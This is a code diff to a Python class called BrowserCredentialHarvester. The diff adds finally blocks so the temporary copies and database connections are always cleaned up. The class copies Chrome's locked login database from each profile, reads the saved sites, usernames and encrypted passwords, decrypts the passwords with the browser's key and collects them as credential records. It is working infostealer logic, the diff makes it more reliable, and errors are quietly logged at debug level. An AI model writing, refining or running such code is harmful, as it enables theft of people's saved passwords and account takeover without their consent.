@@ -149,55 +149,58 @@ class BrowserCredentialHarvester:
         results: list[dict[str, Any]] = []
 
         for browser, login_db_path, local_state_path in self._get_chrome_profiles():
+            tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
+            tmp.close()
             try:
                 # Copy the database (it's locked by Chrome while running)
-                tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
-                tmp.close()
                 shutil.copy2(login_db_path, tmp.name)
 
                 conn = sqlite3.connect(tmp.name)
-                conn.row_factory = sqlite3.Row
-                cursor = conn.cursor()
-
                 try:
-                    cursor.execute(
-                        "SELECT origin_url, username_value, password_value, "
-                        "date_created, date_last_used FROM logins"
-                    )
-                except sqlite3.OperationalError:
-                    conn.close()
-                    os.unlink(tmp.name)
-                    continue
+                    conn.row_factory = sqlite3.Row
+                    cursor = conn.cursor()
 
-                # Get the decryption key
-                decrypt_key = self._get_chrome_decrypt_key(local_state_path)
-
-                profile_name = os.path.basename(os.path.dirname(login_db_path))
-
-                for row in cursor.fetchall():
-                    url = row["origin_url"] or ""
-                    username = row["username_value"] or ""
-                    encrypted_pw = row["password_value"]
-
-                    if not encrypted_pw or not username:
+                    try:
+                        cursor.execute(
+                            "SELECT origin_url, username_value, password_value, "
+                            "date_created, date_last_used FROM logins"
+                        )
+                    except sqlite3.OperationalError:
                         continue
 
-                    password = self._decrypt_chrome_password(encrypted_pw, decrypt_key)
-                    if password:
-                        cred = Credential(
-                            browser=browser,
-                            url=url,
-                            username=username,
-                            password=password,
-                            profile=profile_name,
-                        )
-                        results.append(cred.to_dict())
+                    # Get the decryption key
+                    decrypt_key = self._get_chrome_decrypt_key(local_state_path)
 
-                conn.close()
-                os.unlink(tmp.name)
+                    profile_name = os.path.basename(os.path.dirname(login_db_path))
+
+                    for row in cursor.fetchall():
+                        url = row["origin_url"] or ""
+                        username = row["username_value"] or ""
+                        encrypted_pw = row["password_value"]
+
+                        if not encrypted_pw or not username:
+                            continue
+
+                        password = self._decrypt_chrome_password(encrypted_pw, decrypt_key)
+                        if password:
+                            cred = Credential(
+                                browser=browser,
+                                url=url,
+                                username=username,
+                                password=password,
+                                profile=profile_name,
+                            )
+                            results.append(cred.to_dict())
+                finally:
+                    conn.close()
 
             except Exception as exc:
                 logger.debug("Chrome profile harvest error (%s): %s", browser, exc)
+            finally:
+                try:
+                    os.unlink(tmp.name)
+                except OSError:
+                    pass
 
         return results
 
